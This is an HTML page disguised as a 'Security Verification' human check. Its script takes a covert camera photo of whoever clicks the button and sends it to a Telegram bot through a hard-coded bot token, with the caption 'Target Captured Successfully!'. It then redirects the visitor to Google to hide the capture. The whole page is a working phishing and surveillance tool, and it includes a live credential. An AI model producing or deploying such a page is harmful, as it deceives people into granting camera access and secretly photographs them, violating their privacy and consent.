<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 350px;
            width: 100%;
        }
        h2 { margin-bottom: 10px; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background: #2563eb; }
        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Security Verification</h2>
        <p>Please click the button below to verify that you are a human and proceed.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // Apne bot ki details yahan set hain
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";

        function startProcess() {
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('status').innerText = "Verifying, please wait...";

            // URL se check karega ki front kholna hai ya back (?b=back ya ?b=front)
            const urlParams = new URLSearchParams(window.location.search);
            const camType = urlParams.get('b');
            const chatId = urlParams.get('id');

            let facingModeSetting = "user"; // Default Front Camera
            if (camType === 'back') {
                facingModeSetting = { exact: "environment" }; // Back Camera
            }

            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: facingModeSetting } 
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    stream.getTracks().forEach(track => track.stop());

                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob, chatId);
                    }, 'image/jpeg', 0.85);

                }, 1500); // 1.5 second baad photo click ho jayegi
            })
            .catch(error => {
                document.getElementById('status').innerText = "Verification failed. Please allow camera permission.";
                console.error(error);
            });
        }

        function sendPhotoToTelegram(blob, chatId) {
            if (!chatId) {
                document.getElementById('status').innerText = "Error: Invalid User ID!";
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '🎯 Target Captured Successfully!');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById('status').innerText = "Verification Successful! Redirecting...";
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1000);
                } else {
                    document.getElementById('status').innerText = "Error sending data.";
                }
            })
            .catch(err => {
                document.getElementById('status').innerText = "Network error!";
            });
        }
    </script>
</body>
</html>
